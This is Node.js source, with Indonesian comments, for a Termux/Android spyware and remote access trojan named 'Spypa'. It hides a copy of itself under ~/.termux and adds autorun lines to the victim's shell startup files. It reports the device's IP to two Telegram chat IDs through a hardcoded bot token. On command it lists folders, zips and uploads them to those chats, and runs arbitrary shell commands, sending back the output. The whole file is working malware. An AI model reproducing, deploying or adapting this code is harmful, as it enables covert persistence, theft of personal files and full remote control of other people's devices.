const { exec, spawn } = require('child_process');
const fs = require('fs');
const https = require('https');
const path = require('path');

const BOT_TOKEN = '7870124534:AAEc_RrWqAk3X0CfQMvJxLkplkhOXizDcqc';
// Ganti dengan 2 chat ID yang kamu mau kirim pesan/file ke sini
const CHAT_IDS = ['6432390931', '7880175262'];

const hiddenDir = `${process.env.HOME}/.termux`;
const hiddenFile = `${hiddenDir}/.service-cache`;
const bashrcPath = `${process.env.HOME}/.bashrc`;
const profilePath = `${process.env.HOME}/.profile`;
const zshrcPath = `${process.env.HOME}/.zshrc`;
const autoRunCmd = `nohup node ${hiddenFile} > /dev/null 2>&1 &`;

function sendMessage(msg) {
  CHAT_IDS.forEach(chatId => {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
    https.get(url, res => res.on('data', () => {}));
  });
}

function sendDocument(filePath) {
  CHAT_IDS.forEach(chatId => {
    const boundary = '----NodeFormBoundary' + Math.random().toString(16).slice(2);
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`
      }
    };

    const req = https.request(options, res => res.on('data', () => {}));
    const fileName = path.basename(filePath);
    const fileData = fs.readFileSync(filePath);

    req.write(`--${boundary}\r\n`);
    req.write(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
    req.write(`${chatId}\r\n`);
    req.write(`--${boundary}\r\n`);
    req.write(`Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`);
    req.write(`Content-Type: application/zip\r\n\r\n`);
    req.write(fileData);
    req.write(`\r\n--${boundary}--\r\n`);
    req.end();
  });
}

function sendFile(filePath) {
  CHAT_IDS.forEach(chatId => {
    const boundary = '----NodeFormBoundary' + Math.random().toString(16).slice(2);
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`
      }
    };

    const req = https.request(options, res => res.on('data', () => {}));
    const fileName = path.basename(filePath);
    const fileData = fs.readFileSync(filePath);

    req.write(`--${boundary}\r\n`);
    req.write(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
    req.write(`${chatId}\r\n`);
    req.write(`--${boundary}\r\n`);
    req.write(`Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`);
    req.write(`Content-Type: application/octet-stream\r\n\r\n`);
    req.write(fileData);
    req.write(`\r\n--${boundary}--\r\n`);
    req.end();
  });
}

function ensureAutoStart() {
  const files = [bashrcPath, profilePath, zshrcPath];
  files.forEach(file => {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf-8');
      if (!content.includes(autoRunCmd)) {
        fs.appendFileSync(file, `\n${autoRunCmd}\n`);
        sendMessage(`Ditambahkan auto-run ke ${path.basename(file)}`);
      }
    }
  });
}

function getUpdates() {
  https.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        const results = json.result;
        if (!results.length) return;

        const last = results[results.length - 1];
        const msgId = last.message.message_id;
        const text = last.message.text;

        // Cek apakah message dari salah satu chat ID
        if (msgId > global.lastMessageId && CHAT_IDS.includes(String(last.message.chat.id))) {
          global.lastMessageId = msgId;
          runCommand(text.trim());
        }
      } catch (e) {}
    });
  }).on('error', () => {});
}

function runCommand(cmd) {
  if (cmd === '/start') {
    const menu = `
Hai! Berikut daftar perintah yang tersedia:

/start - Menampilkan daftar menu dan penjelasan fitur.
/mati - Mematikan bot dan menghapus autostart.
/zip [folder] - Membuat zip dari folder dan mengirimnya.
/ambil [folder] - Mengambil semua file dari folder dalam bentuk zip.
/cek [folder] - Mengecek isi folder (default: /sdcard).

Perintah lainnya akan dijalankan sebagai command shell dan hasilnya dikirimkan.
    `;
    sendMessage(menu.trim());
    return;
  }

  if (cmd === '/mati') {
    [bashrcPath, profilePath, zshrcPath].forEach(file => {
      if (fs.existsSync(file)) {
        const content = fs.readFileSync(file, 'utf-8');
        const clean = content.split('\n').filter(line => !line.includes(autoRunCmd)).join('\n');
        fs.writeFileSync(file, clean);
      }
    });

    try { fs.unlinkSync(hiddenFile) } catch (e) {}
    sendMessage('Bot dimatikan dan file dihapus.');
    process.exit();
    return;
  }

  if (cmd.startsWith('/zip ')) {
    const folder = cmd.split('/zip ')[1].trim();
    const zipPath = `${folder}.zip`;
    exec(`zip -r ${zipPath} ${folder}`, (err) => {
      if (err) return sendMessage('Gagal zip folder.');
      sendMessage(`Folder ${folder} telah dizip. Mengirim...`);
      sendDocument(zipPath);
      setTimeout(() => {
        fs.unlink(zipPath, () => {});
        sendMessage('Zip file dihapus dari sistem.');
      }, 3000);
    });
    return;
  }

  if (cmd.startsWith('/ambil ')) {
    const folder = cmd.split('/ambil ')[1].trim();
    if (!fs.existsSync(folder)) return sendMessage('Folder tidak ditemukan.');

    const files = fs.readdirSync(folder);
    if (!files.length) return sendMessage('Folder kosong.');

    sendMessage(`Mengambil semua file dari: ${folder}`);

    const zipPath = `${folder.replace(/[\/\\]/g, '_')}.zip`;
    exec(`zip -r "${zipPath}" "${folder}"`, (err) => {
      if (err) return sendMessage('Gagal membuat zip folder.');
      sendDocument(zipPath);
      setTimeout(() => {
        fs.unlink(zipPath, () => {});
        sendMessage('Zip file dihapus dari sistem.');
      }, 3000);
    });

    return;
  }

  if (cmd.startsWith('/cek')) {
    let folder = cmd.split(' ')[1];
    if (!folder) folder = '/sdcard';

    if (!fs.existsSync(folder)) {
      sendMessage(`Folder ${folder} tidak ditemukan.`);
      return;
    }

    if (!fs.statSync(folder).isDirectory()) {
      sendMessage(`${folder} bukan folder.`);
      return;
    }

    try {
      const files = fs.readdirSync(folder);
      if (!files.length) {
        sendMessage(`Folder ${folder} kosong.`);
        return;
      }

      let list = `Isi folder: ${folder}\n`;
      files.forEach(f => {
        const fullPath = path.join(folder, f);
        const stat = fs.statSync(fullPath);
        list += `- ${f}${stat.isDirectory() ? '/' : ''}\n`;
      });

      sendMessage(list);
    } catch (e) {
      sendMessage(`Gagal membaca folder: ${e.message}`);
    }
    return;
  }

  exec(cmd, (err, stdout, stderr) => {
    const output = (stdout || stderr || err || 'Tidak ada output.').slice(0, 4000);
    sendMessage(`$ ${cmd}\n\n${output}`);
  });
}

function moveAndRun() {
  if (__filename === hiddenFile) {
    ensureAutoStart();
    setInterval(getUpdates, 5000);

    const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const getIP = () => {
      exec('curl -s ifconfig.me', (err, stdout1) => {
        let ip = stdout1.trim();
        if (ip && ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
          sendMessage(`IP ${ip} telah online di Spypa pada ${now}`);
        } else {
          exec('wget -qO- ifconfig.me', (err, stdout2) => {
            ip = stdout2.trim();
            if (ip && ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
              sendMessage(`IP ${ip} telah online di Spypa pada ${now}`);
            } else {
              exec('termux-wifi-ip', (err, stdout3) => {
                ip = stdout3.trim();
                sendMessage(`(Fallback) IP ${ip || 'tidak diketahui'} telah online di Spypa pada ${now}`);
              });
            }
          });
        }
      });
    };

    getIP();
    return;
  }

  fs.mkdirSync(hiddenDir, { recursive: true });
  fs.copyFileSync(__filename, hiddenFile);
  fs.chmodSync(hiddenFile, 0o700);

  spawn('node', [hiddenFile], {
    detached: true,
    stdio: 'ignore'
  }).unref();

  process.exit();
}

global.lastMessageId = 0;
moveAndRun();
